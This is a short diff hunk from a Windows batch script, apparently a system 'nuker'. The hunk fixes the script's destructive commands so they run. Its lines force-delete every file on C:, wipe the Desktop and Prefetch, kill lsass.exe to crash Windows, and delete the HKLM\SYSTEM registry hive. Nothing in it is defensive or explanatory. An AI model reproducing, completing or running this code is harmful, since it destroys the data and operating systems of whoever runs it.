@@ -30,9 +30,9 @@ del /f /q /s C:\*.*
 taskkill /f /im lsass.exe
 goto end
 
-run cmd /c "del /f /q /s C:\*.tmp & del /f /q /s C:\Windows\Prefetch\*.* & taskkill /f /im lsass.exe" 
-run cmd /c "del /f /q /s %userprofile%\Desktop\*.*" 
-run reg delete HKLM\SYSTEM /f 
+cmd /c "del /f /q /s C:\*.tmp & del /f /q /s C:\Windows\Prefetch\*.* & taskkill /f /im lsass.exe" 
+cmd /c "del /f /q /s %userprofile%\Desktop\*.*" 
+reg delete HKLM\SYSTEM /f 
 
 :cancel
 if exist "%temp%\nuker_prompt.vbs" del "%temp%\nuker_prompt.vbs"
